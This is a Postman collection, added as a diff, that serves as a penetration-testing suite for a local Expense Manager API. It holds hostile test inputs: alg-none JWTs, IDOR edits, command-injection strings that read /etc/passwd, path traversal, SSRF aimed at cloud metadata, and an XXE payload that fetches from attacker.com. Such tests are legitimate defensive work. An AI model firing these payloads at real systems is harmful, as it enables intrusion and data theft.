@@ -1,0 +1,597 @@
+{
+  "info": {
+    "name": "Expense Manager API - Enhanced Penetration Testing Suite",
+    "description": "Comprehensive penetration testing suite for the Expense Manager API covering authentication, authorization, input validation, business logic, security vulnerabilities, JWT security, IDOR, race conditions, command injection, path traversal, CORS, and more.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "version": "2.0.0"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8080" },
+    { "key": "validToken", "value": "eyJhbGciOiJIUzI1NiJ9.valid_token_here" },
+    { "key": "invalidToken", "value": "eyJhbGciOiJIUzI1NiJ9.invalid_token" },
+    { "key": "expiredToken", "value": "eyJhbGciOiJIUzI1NiJ9.expired_token" },
+    { "key": "malformedToken", "value": "not.a.jwt.token" },
+    { "key": "userId", "value": "1" },
+    { "key": "categoryId", "value": "1" },
+    { "key": "expenseId", "value": "1" },
+    { "key": "budgetId", "value": "1" }
+  ],
+  "item": [
+    {
+      "name": "JWT Security Tests",
+      "item": [
+        {
+          "name": "JWT - Token with Null Signature",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0." }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "JWT - Modified Payload (Admin Claim)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwiYWRtaW4iOiJ0cnVlIn0.signature" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "JWT - Missing Signature Part",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "JWT - Algorithm None Attack",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer eyJhbGciOiJub25lIiwidHlwZSI6IlBST0RVQ1QifQ.eyJzdWIiOiIxIn0." }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "JWT - Key Confusion Attack (RS256 to HS256)",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dummy_signature" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "IDOR (Insecure Direct Object Reference) Tests",
+      "item": [
+        {
+          "name": "IDOR - Access Other User's Expense by ID",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses/99999", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "99999"] }
+          }
+        },
+        {
+          "name": "IDOR - Update Other User's Expense",
+          "request": {
+            "method": "PUT",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 999999.99,\n  \"date\": \"2024-01-01\",\n  \"description\": \"Hacked expense\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses/99999", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "99999"] }
+          }
+        },
+        {
+          "name": "IDOR - Delete Other User's Expense",
+          "request": {
+            "method": "DELETE",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses/99999", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "99999"] }
+          }
+        },
+        {
+          "name": "IDOR - Modify Other User's Budget",
+          "request": {
+            "method": "PUT",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"categoryId\": {{categoryId}},\n  \"year\": 2024,\n  \"month\": 1,\n  \"limitAmount\": 0.01,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/budgets/99999", "host": ["{{baseUrl}}"], "path": ["api", "budgets", "99999"] }
+          }
+        },
+        {
+          "name": "IDOR - Delete Other User's Budget",
+          "request": {
+            "method": "DELETE",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/budgets/99999", "host": ["{{baseUrl}}"], "path": ["api", "budgets", "99999"] }
+          }
+        },
+        {
+          "name": "IDOR - Access Other User's Category",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/categories/99999", "host": ["{{baseUrl}}"], "path": ["api", "categories", "99999"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Race Condition Tests",
+      "item": [
+        {
+          "name": "Race - Concurrent Budget Creation (Same Category/Month)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"categoryId\": {{categoryId}},\n  \"year\": 2024,\n  \"month\": 6,\n  \"limitAmount\": 1000.00,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/budgets", "host": ["{{baseUrl}}"], "path": ["api", "budgets"] }
+          }
+        },
+        {
+          "name": "Race - Concurrent Expense Creation",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 10.00,\n  \"date\": \"2024-01-15\",\n  \"description\": \"Race test\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Race - Multiple Simultaneous Login Attempts",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"race@test.com\",\n  \"password\": \"password123\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "auth", "login"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Command Injection Tests",
+      "item": [
+        {
+          "name": "Command - OS Command in Email Field",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@example.com; ls -la\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Command - Shell Pipe in Description",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2024-01-15\",\n  \"description\": \"test | cat /etc/passwd\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Command - Backtick Execution",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2024-01-15\",\n  \"description\": \"Test `whoami`\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Command - Dollar Sign Execution",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2024-01-15\",\n  \"description\": \"Test $(whoami)\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Path Traversal Tests",
+      "item": [
+        {
+          "name": "Path Traversal - Directory Traversal",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses/../../../../etc/passwd", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "..", "..", "..", "..", "etc", "passwd"] }
+          }
+        },
+        {
+          "name": "Path Traversal - Null Byte Injection",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses/%00.jpg", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "%00.jpg"] }
+          }
+        },
+        {
+          "name": "Path Traversal - Double URL Encoding",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses/%252e%252e%252fetc%252fpasswd", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "%252e%252e%252fetc%252fpasswd"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "CORS & Security Headers Tests",
+      "item": [
+        {
+          "name": "CORS - Arbitrary Origin Reflection",
+          "request": {
+            "method": "GET",
+            "header": [
+              { "key": "Origin", "value": "http://malicious-site.com" },
+              { "key": "Authorization", "value": "Bearer {{validToken}}" }
+            ],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "CORS - Credentials with Wildcard Origin",
+          "request": {
+            "method": "GET",
+            "header": [
+              { "key": "Origin", "value": "*" },
+              { "key": "Access-Control-Request-Credentials", "value": "true" },
+              { "key": "Authorization", "value": "Bearer {{validToken}}" }
+            ],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Security - Check Missing Security Headers",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": { "raw": "{{baseUrl}}/api/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "auth", "login"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Information Disclosure Tests",
+      "item": [
+        {
+          "name": "Info Disclosure - Detailed Error Messages",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{invalidToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Info Disclosure - Debug Header",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "X-Debug", "value": "true" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Info Disclosure - Trace Method",
+          "request": {
+            "method": "TRACE",
+            "header": [],
+            "url": { "raw": "{{baseUrl}}/api/auth/login", "host": ["{{baseUrl}}"], "path": ["api", "auth", "login"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Weak Password & Input Validation Tests",
+      "item": [
+        {
+          "name": "Weak Password - Single Character",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"weakpass@example.com\",\n  \"password\": \"a\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Weak Password - Common Password",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"commonpass@example.com\",\n  \"password\": \"password\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Weak Password - Numeric Only",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"numbersonly@example.com\",\n  \"password\": \"12345678\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Invalid Email - No Domain",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Invalid Email - Multiple @",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@@example.com\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Invalid Currency Code",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2024-01-15\",\n  \"description\": \"Test\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"XXX\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Business Logic Bypass Tests",
+      "item": [
+        {
+          "name": "Bypass - Future Date Expense",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2030-12-31\",\n  \"description\": \"Future expense\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Bypass - Decimal in Integer Field (Month)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"categoryId\": {{categoryId}},\n  \"year\": 2024,\n  \"month\": 1.5,\n  \"limitAmount\": 1000.00,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/budgets", "host": ["{{baseUrl}}"], "path": ["api", "budgets"] }
+          }
+        },
+        {
+          "name": "Bypass - String in Numeric Field",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"categoryId\": {{categoryId}},\n  \"year\": \"2024\",\n  \"month\": \"1\",\n  \"limitAmount\": \"1000.00\",\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/budgets", "host": ["{{baseUrl}}"], "path": ["api", "budgets"] }
+          }
+        },
+        {
+          "name": "Bypass - Boolean as String in Amount",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": \"true\",\n  \"date\": \"2024-01-15\",\n  \"description\": \"Test\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Bypass - Delete All Categories",
+          "request": {
+            "method": "DELETE",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/categories/{{categoryId}}", "host": ["{{baseUrl}}"], "path": ["api", "categories", "{{categoryId}}"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "SSRF & External Interaction Tests",
+      "item": [
+        {
+          "name": "SSRF - Internal IP in Email",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@192.168.1.1\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "SSRF - Localhost in Email",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@localhost\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "SSRF - Cloud Metadata Endpoint",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@169.254.169.254\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Mass Assignment Tests",
+      "item": [
+        {
+          "name": "Mass Assignment - Add Admin Field",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"adminuser@example.com\",\n  \"password\": \"password123\",\n  \"fullName\": \"Admin User\",\n  \"isAdmin\": true\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Mass Assignment - Add Role Field",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"roleuser@example.com\",\n  \"password\": \"password123\",\n  \"fullName\": \"Role User\",\n  \"role\": \"ADMIN\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Mass Assignment - Add UserID in Expense",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50,\n  \"date\": \"2024-01-15\",\n  \"description\": \"Test\",\n  \"categoryId\": {{categoryId}},\n  \"recurring\": false,\n  \"currency\": \"USD\",\n  \"userId\": 999\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "XML External Entity (XXE) Tests",
+      "item": [
+        {
+          "name": "XXE - XML External Entity in Request",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "XXE - Blind XXE with Parameter",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>" },
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "HTTP Verb Tampering Tests",
+      "item": [
+        {
+          "name": "HTTP Verb - PATCH Method",
+          "request": {
+            "method": "PATCH",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\n  \"amount\": 100.50\n}" },
+            "url": { "raw": "{{baseUrl}}/api/expenses/{{expenseId}}", "host": ["{{baseUrl}}"], "path": ["api", "expenses", "{{expenseId}}"] }
+          }
+        },
+        {
+          "name": "HTTP Verb - OPTIONS Method",
+          "request": {
+            "method": "OPTIONS",
+            "header": [],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "HTTP Verb - HEAD Method",
+          "request": {
+            "method": "HEAD",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Unicode & Encoding Tests",
+      "item": [
+        {
+          "name": "Unicode - Homograph Attack in Email",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@exаmple.com\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Unicode - Full Width Characters",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@example.com\",\n  \"password\": \"password123\",\n  \"fullName\": \"Test User\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/register", "host": ["{{baseUrl}}"], "path": ["api", "auth", "register"] }
+          }
+        },
+        {
+          "name": "Encoding - Double URL Encoding",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses?categoryId=%2527", "host": ["{{baseUrl}}"], "path": ["api", "expenses"], "query": [{ "key": "categoryId", "value": "%2527" }] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Session & Authentication Tests",
+      "item": [
+        {
+          "name": "Session - Concurrent Session Token Usage",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Session - Logout Without Token Invalidation Check",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "url": { "raw": "{{baseUrl}}/api/expenses", "host": ["{{baseUrl}}"], "path": ["api", "expenses"] }
+          }
+        },
+        {
+          "name": "Auth - Password Reset Link Generation",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": { "mode": "raw", "raw": "{\n  \"email\": \"test@example.com\"\n}" },
+            "url": { "raw": "{{baseUrl}}/api/auth/forgot-password", "host": ["{{baseUrl}}"], "path": ["api", "auth", "forgot-password"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "GraphQL/API Schema Tests",
+      "item": [
+        {
+          "name": "API Schema - Introspection Query",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\"query\":\"{__schema{types{name}}}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/graphql", "host": ["{{baseUrl}}"], "path": ["api", "graphql"] }
+          }
+        },
+        {
+          "name": "API Schema - Introspection Query Types",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Authorization", "value": "Bearer {{validToken}}" }],
+            "body": { "mode": "raw", "raw": "{\"query\":\"{__typename}\"}" },
+            "url": { "raw": "{{baseUrl}}/api/graphql", "host": ["{{baseUrl}}"], "path": ["api", "graphql"] }
+          }
+        }
+      ]
+    }
+  ]
+}
